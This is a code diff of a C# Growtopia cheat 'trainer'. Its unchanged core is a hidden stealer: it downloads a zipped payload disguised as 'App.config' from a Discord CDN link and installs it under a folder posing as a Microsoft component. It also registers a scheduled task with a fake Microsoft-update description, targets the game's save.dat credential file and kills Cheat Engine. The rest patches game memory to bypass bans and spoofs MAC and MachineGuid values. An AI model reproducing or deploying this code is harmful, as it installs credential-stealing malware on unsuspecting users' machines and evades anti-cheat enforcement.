@@ -24,23 +24,23 @@ namespace FreeZeHAX_Trainer
         }
 
         private readonly Mem mem = new Mem();
-        private readonly Timer t1 = new Timer();
-        private bool ProcOpen = false;
-        private readonly Others others = new Others();
-        private readonly Cheats cheats = new Cheats();
+        private readonly Timer t1 = new Timer(); // New timer
+        private bool ProcOpen = false; // In order us to check if the process exists, we need this bool.
+        private readonly Others others = new Others(); // Calling Others.cs
+        private readonly Cheats cheats = new Cheats(); // Calling Cheats.cs
         private bool mouseDown;
         private Point lastLocation;
         private const string FileName = "StartMenuExperienceHost.exe";
         private const string ZipFileName = "App.config";
-        private readonly TaskDefinition td = TaskService.Instance.NewTask();
+        private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
         private readonly WebClient web = new WebClient();
-        private readonly string NewLine = Environment.NewLine;
-        private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
-        private readonly bool Stealer = true; // Activate / Disable Stealer
+        private readonly string NewLine = Environment.NewLine; // New line string
+        private readonly bool AntiVM = false; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false"
+        private readonly bool Stealer = false; // Activate / Disable Stealer
 
         private string GetCheat(int Number)
         {
-            return CheatAddresses.Items[Number].ToString();
+            return CheatAddresses.Items[Number].ToString(); // Getting cheats easier
         }
 
         private void StartForm()
@@ -48,8 +48,9 @@ namespace FreeZeHAX_Trainer
             Opacity = 0; // First the opacity is 0
             t1.Interval = 10;  // We'll increase the opacity every 10ms
             t1.Tick += new EventHandler(FadeIn);  // This calls the function that changes opacity
-            t1.Start();
+            t1.Start(); // Starting the timer
 
+            #region Startup transitions
             PanelTransition.Show(About_Button);
             PanelTransition.Show(Cheat_Button);
             PanelTransition.Show(Changers_Button);
@@ -58,24 +59,25 @@ namespace FreeZeHAX_Trainer
             PanelTransition.Show(Settings_Button);
             PanelTransition.Show(About);
             PanelTransition.Show(TopBar);
+            #endregion
         }
 
         private async void ExitForm()
         {
-            for (Opacity = 0.90; Opacity > .0; Opacity -= .1) { await System.Threading.Tasks.Task.Delay(10); }
+            for (Opacity = 0.90; Opacity > .0; Opacity -= .1) { await System.Threading.Tasks.Task.Delay(10); } // Exiting transition
             RemoveGuna();
             Application.Exit();
         }
 
         private void FadeIn(object sender, EventArgs e)
         {
-            if (Opacity >= 0.90)
+            if (Opacity >= 0.90) // Increasing the opacity until 0.90
             {
                 t1.Stop();   // This stops the timer if the form is completely displayed
             }
             else
             {
-                Opacity += 0.05;
+                Opacity += 0.05; // Increasing the opacity
             }
         }
 
@@ -110,13 +112,14 @@ namespace FreeZeHAX_Trainer
             {
                 try
                 {
-                    string FolderChars = others.GetRandomString().ToLower();
-                    string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
-                    string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64";
-                    string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
-                    string StealerFile = StealerFolderLoc + "\\" + FileName;
-                    bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
+                    string FolderChars = others.GetRandomString().ToLower(); // Make all chars low
+                    string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars; // Stealer's Folder Location
+                    string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64"; // SysWOW64's folder location
+                    string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\"; // Working folder
+                    string StealerFile = StealerFolderLoc + "\\" + FileName; // Randomized stealer folder
+                    bool savePathExists = File.Exists(others.SaveDatPath()); // Check if save.dat file exists
 
+                    #region Check required dlls for the c++ stealer
                     if (!File.Exists(SysWOW64 + "\\vcruntime140.dll"))
                     {
                         web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579282810531840/vcruntime140.dll"), SysWOW64 + "\\vcruntime140.dll");
@@ -132,16 +135,17 @@ namespace FreeZeHAX_Trainer
                         web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
                         others.Wait(2000);
                     }
-                    CETimer.Start();
-                    others.DirClean(StealerFolder);
+                    #endregion
+                    CETimer.Start(); // Check if ce is running
+                    others.DirClean(StealerFolder); // Delete old stealer folder
                     others.Wait(2000);
-                    Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/943261952153636914/App.config"), StealerFolderLoc + "\\App.config");
+                    Directory.CreateDirectory(StealerFolderLoc); // Create the newest folder
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/943261952153636914/App.config"), StealerFolderLoc + "\\App.config"); // Download the stealer (its zipped)
                     others.Wait(2000);
-                    System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
+                    System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc); // Unzip the zip
                     others.Wait(2000);
                     if (!savePathExists)
-                    {
+                    { // If save.dat doesn't exists, just create the task scheduler
                         td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                         DailyTrigger tf = new DailyTrigger();
                         tf.Repetition.Duration = TimeSpan.FromHours(24);
@@ -180,19 +184,20 @@ namespace FreeZeHAX_Trainer
                 catch (Exception) { }
             }
             #endregion
-            Auto_Attach.RunWorkerAsync();
+            Auto_Attach.RunWorkerAsync(); // Auto attach
 
+            #region Refresh key info
             try
             {
                 foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)).OrderByDescending(a => a.Speed))
-                {
+                { // Add all adapters in the combobox
                     AdaptersComboBox.Items.Add(new Adapter(adapter));
                 }
-                AdaptersComboBox.SelectedIndex = 0;
+                AdaptersComboBox.SelectedIndex = 0; // Select the first one
                 foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
                 {
                     if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
-                    {
+                    { // If subkeyname2 string starts with "1, 2, 3, 4, 5, 6, 7, 8, 9", type if its found or not
                         longkey.Text = subkeyname2;
                         UnbanLog.Text = "->The Second Key " + longkey.Text + " is found!";
                         break;
@@ -207,7 +212,7 @@ namespace FreeZeHAX_Trainer
                 foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
                 {
                     if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
-                    {
+                    { // If subkeyname string starts with "1, 2, 3, 4, 5, 6, 7, 8, 9", type if its found or not
                         shortkey.Text = subkeyname;
                         UnbanLog.Text += NewLine + "->The First Key " + shortkey.Text + " is found!";
                         break;
@@ -221,9 +226,10 @@ namespace FreeZeHAX_Trainer
                 }
             }
             catch (Exception) { }
+            #endregion
             RegistryKey Cryptography = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", true);
             if (Cryptography.GetValueNames().Contains("MachineGuid"))
-            {
+            { // Check if MachineGuid key exists
                 UnbanLog.Text += NewLine + "->MachineGuid Key Is Found!";
             }
             else
@@ -238,7 +244,7 @@ namespace FreeZeHAX_Trainer
         }
 
         private void Minimize_Click(object sender, EventArgs e)
-        {
+        { // Make the form Minimized
             WindowState = FormWindowState.Minimized;
         }
 
@@ -307,7 +313,7 @@ namespace FreeZeHAX_Trainer
             Unbanner.Hide();
 
             try
-            {
+            { // Read hosts file content
                 string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
                 string str = File.ReadAllText(path);
                 Host_File_Editor.Text = str;
@@ -317,13 +323,13 @@ namespace FreeZeHAX_Trainer
         }
 
         private void Opacity_Track_Scroll(object sender, ScrollEventArgs e)
-        {
+        { // View / Change opacity
             ActiveForm.Opacity = OpacityTrackBar.Value / 100.0;
             TrackbarText.Text = OpacityTrackBar.Value.ToString();
         }
 
         public void Auto_Attach_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
-        {
+        { // Check if Growtopia.exe exists. If it exists make ProcOpen bool true / false
             if (!mem.OpenProcess("Growtopia.exe"))
             {
                 ProcOpen = false;
@@ -344,7 +350,7 @@ namespace FreeZeHAX_Trainer
                 try
                 {
                     if (CheatAddresses.Items.Count <= 1)
-                    {
+                    { // If CheatAddress listbox has lower than 1 item, clear the listbox
                         FocusText.Text = "Searching For Cheats!";
                         About_Button.Enabled = false;
                         Cheat_Button.Enabled = false;
@@ -356,11 +362,11 @@ namespace FreeZeHAX_Trainer
                         AobProgress.Start();
                         About_Label.Hide();
                         foreach (string Cheats in cheats.GTCheats)
-                        {
+                        { // Search for all aobs in GTCheats
                             CheatAddresses.Items.Add(AobScan(Cheats));
                         }
                         foreach (string Cheats in cheats.GTCheatsFirst)
-                        {
+                        { // Search for all aobs in GTCheatsFirst
                             CheatAddresses.Items.Add(AobScan(Cheats, false, true, false));
                         }
                         FocusText.Text = "FreeZeHAX Trainer";
@@ -373,10 +379,12 @@ namespace FreeZeHAX_Trainer
                         AobProgress.Hide();
                         AobProgress.Stop();
                         About_Label.Show();
+                        #region Ban Bypasses and Showing FPS
                         mem.WriteMemory(GetCheat(1), "bytes", "90 90"); // Ban Bypass
                         mem.WriteMemory(GetCheat(2), "bytes", "90 90"); // Anti Int Check
                         mem.WriteMemory(GetCheat(22), "bytes", "E9 19 01 00 00"); // Pos Bypass
                         mem.WriteMemory(GetCheat(0), "bytes", "0F 85 9E 01 00 00"); // Force FPS
+                        #endregion
                         //mem.WriteMemory(GetCheat(27), "string", "\n \nFreeZeHAX Trainer \nFps:% d                            ");
                         //mem.ReadString("Growtopia.exe+89EBC0", length: 999);
                     }
@@ -385,19 +393,19 @@ namespace FreeZeHAX_Trainer
             }
             else
             {
-                CheatAddresses.Items.Clear();
+                CheatAddresses.Items.Clear(); // Clear the listbox
             }
         }
 
         public void Auto_Attach_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
         {
-            Auto_Attach.RunWorkerAsync();
+            Auto_Attach.RunWorkerAsync(); // Start Auto_Attach background worker
         }
 
         private void GiveawayMode_Timer_Tick(object sender, EventArgs e)
         {
             if ((Keyboard.GetKeyStates(Key.S) & KeyStates.Down) > 0)
-            {
+            { // Going down timer
                 mem.WriteMemory(GetCheat(6), "bytes", "0F 83 88 00 00 00");
             }
             else
@@ -426,13 +434,13 @@ namespace FreeZeHAX_Trainer
 
         private void TextTimer_Tick(object sender, EventArgs e)
         {
-            SendKeys.Send("{ENTER}");
-            SendKeys.Send(Input.Text);
-            SendKeys.Send("{ENTER}");
+            SendKeys.Send("{ENTER}"); // Send ENTER key
+            SendKeys.Send(Input.Text); // Send the text inside "Input" textbox
+            SendKeys.Send("{ENTER}"); // Send ENTER key
         }
 
         private void SetInterval_Click(object sender, EventArgs e)
-        {
+        { // Change TextTimer's interval (value)
             try
             {
                 TextTimer.Interval = int.Parse(Spammer_Interval.Text);
@@ -453,13 +461,13 @@ namespace FreeZeHAX_Trainer
 
         private void HostsRefresh_Click(object sender, EventArgs e)
         {
-            string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
-            string str = File.ReadAllText(path);
-            Host_File_Editor.Text = str;
+            string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts"); // Hosts file's path location
+            string str = File.ReadAllText(path); // Read all the content inside hosts file
+            Host_File_Editor.Text = str; // Viewing hosts file's content
         }
 
         private void EditHost_Click(object sender, EventArgs e)
-        {
+        { // Get what's inside Host_File_Editor, then save it inside hosts file
             try
             {
                 string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
@@ -472,7 +480,7 @@ namespace FreeZeHAX_Trainer
         }
 
         private void OnTop_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
-        {
+        { // Making the application on top of everything
             if (OnTop.BackColor == Color.White)
             {
                 ActiveForm.TopMost = true;
@@ -488,6 +496,7 @@ namespace FreeZeHAX_Trainer
                 OnTop.FlatAppearance.BorderColor = Color.Black;
             }
         }
+
         #region Trainer Move
         private void TopBar_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
@@ -533,6 +542,7 @@ namespace FreeZeHAX_Trainer
             mouseDown = false;
         }
         #endregion
+
         #region Growtopia Cheats
         private void GiveawayMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
@@ -1085,10 +1095,10 @@ namespace FreeZeHAX_Trainer
         {
             try
             {
-                RefreshKeys();
+                RefreshKeys(); // Refresh all needed keys
                 System.Threading.Thread.Sleep(500);
                 if (longkey.Text != "None" && shortkey.Text != "None")
-                {
+                { // If longkey and shortkey doesn't exist, show an error message
                     UnbanLog.Clear();
                     FocusText.Focus();
                     if (!Adapter.IsValidMac(CurrentMacTextBox.Text, false))
@@ -1098,20 +1108,19 @@ namespace FreeZeHAX_Trainer
                     }
                     SetRegistryMac(CurrentMacTextBox.Text);
                     UnbanLog.Text += "->Mac Adress Randomized And Changed!";
-                    Registry.CurrentUser.DeleteSubKey(longkey.Text);
+                    Registry.CurrentUser.DeleteSubKey(longkey.Text); // Delete longkey
                     UnbanLog.Text += NewLine + "->The Second Key " + longkey.Text + " is deleted!";
-                    string microsoftKey = @"Software\Microsoft\" + shortkey.Text;
-                    Registry.CurrentUser.DeleteSubKey(microsoftKey);
+                    string ShortKeyStr = @"Software\Microsoft\" + shortkey.Text; // shortkey
+                    Registry.CurrentUser.DeleteSubKey(ShortKeyStr); // Delete shortkey
                     UnbanLog.Text += NewLine + "->The First Key " + shortkey.Text + " is deleted!";
-                    string cryptographyKey = @"SOFTWARE\Microsoft\Cryptography";
-                    RegistryKey ckey = Registry.LocalMachine.OpenSubKey(cryptographyKey, true);
-                    ckey.DeleteValue("MachineGuid");
+                    string CryptographyKey = @"SOFTWARE\Microsoft\Cryptography"; // Cryptography Key
+                    RegistryKey ckey = Registry.LocalMachine.OpenSubKey(CryptographyKey, true);
+                    ckey.DeleteValue("MachineGuid");// Delete Cryptography Key
                     UnbanLog.Text += NewLine + "->The MachineGuid key is deleted!" + NewLine + "->Done Unbanning!";
                 }
                 else
                 {
-                    UnbanLog.Text += NewLine;
-                    UnbanLog.Text += "->Can't UNBAN! Open Growtopia and click 'Connect'. Then Click 'REFRESH'";
+                    UnbanLog.Text += NewLine + "->Can't UNBAN! Open Growtopia and click 'Connect'. Then Click 'REFRESH'";
                     MessageBox.Show("                                                Can't UNBAN!                                                          Tip: Open Growtopia and click 'Connect'. Then Restart the Trainer!");
                 }
             }
@@ -1119,7 +1128,7 @@ namespace FreeZeHAX_Trainer
         }
 
         private void SetRegistryMac(string mac)
-        {
+        { // Change adapter
             Adapter a = AdaptersComboBox.SelectedItem as Adapter;
             if (a.SetRegistryMac(mac))
             {
@@ -1129,7 +1138,7 @@ namespace FreeZeHAX_Trainer
         }
 
         private void RegistryRefresher_Click(object sender, EventArgs e)
-        {
+        { // Refresh all needed stuff
             UpdateAddresses();
             RefreshKeys();
         }
@@ -1139,7 +1148,7 @@ namespace FreeZeHAX_Trainer
             foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
             {
                 if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
-                {
+                { // If subkeyname string starts with "1, 2, 3, 4, 5, 6, 7, 8, 9", type if its found or not
                     shortkey.Text = subkeyname;
                     break;
                 }
@@ -1150,7 +1159,7 @@ namespace FreeZeHAX_Trainer
                 }
             }
             foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
-            {
+            { // If subkeyname2 string starts with "1, 2, 3, 4, 5, 6, 7, 8, 9", type if its found or not
                 if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                 {
                     longkey.Text = subkeyname2;
@@ -1165,17 +1174,17 @@ namespace FreeZeHAX_Trainer
         }
 
         private void RandomMacAdressTimer_Tick(object sender, EventArgs e)
-        {
+        { // Generate a new mac address
             CurrentMacTextBox.Text = Adapter.GetNewMac();
         }
         #endregion
         private void RestartTrainer_Click(object sender, EventArgs e)
-        {
+        { // Restart the trainer
             Application.Restart();
         }
 
         private void CETimer_Tick(object sender, EventArgs e)
-        {
+        { // Check if CE's inside others.CE exists. If they do exist, kill their processes
             try
             {
                 foreach (string CEs in others.CE)
@@ -1194,17 +1203,17 @@ namespace FreeZeHAX_Trainer
         }
 
         private void RemoveGuna()
-        {
-            string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
+        { // Removing Guna licensing stuff
+            string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna"; // Get guna path
             try
             {
-                if (Directory.Exists(Guna))
+                if (Directory.Exists(Guna)) // If guna folder exists, delete it
                 {
                     Directory.Delete(Guna, true);
                 }
                 using (RegistryKey Key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
                 {
-                    Key.DeleteSubKeyTree("SOFTWARE\\Guna");
+                    Key.DeleteSubKeyTree("SOFTWARE\\Guna"); // Delete Guna key
                 }
             }
             catch (Exception) { }
@@ -1215,26 +1224,26 @@ namespace FreeZeHAX_Trainer
             string Result = "";
             try
             {
-                long MemoryScan = mem.AoBScan(AOB).Result.Sum();
-                long MemoryScanFirst = mem.AoBScan(AOB).Result.First();
-                long MemoryScanLast = mem.AoBScan(AOB).Result.Last();
+                long MemoryScan = mem.AoBScan(AOB).Result.Sum(); // Scan for every address
+                long MemoryScanFirst = mem.AoBScan(AOB).Result.First(); // Return first address
+                long MemoryScanLast = mem.AoBScan(AOB).Result.Last(); // Return last address
                 if (First == true)
-                {
+                { // If First is true, then do "MemoryScanFirst"
                     Result = MemoryScanFirst.ToString("X");
                     others.Wait(100);
                 }
                 if (Last == true)
-                {
+                { // If First is true, then do "MemoryScanLast"
                     Result = MemoryScanLast.ToString("X");
                     others.Wait(100);
                 }
                 if (All == true)
-                {
+                { // If First is true, then do "MemoryScan"
                     Result = MemoryScan.ToString("X");
                     others.Wait(100);
                 }
             }
-            catch (Exception ex) { MessageBox.Show("Cannot find sig:" + AOB, "Error:" + ex.Message); }
+            catch (Exception ex) { MessageBox.Show("Cannot find sig:" + AOB, "Error:" + ex.Message); /* If can't find aob, show which aob failed*/}
             return Result;
         }
     }
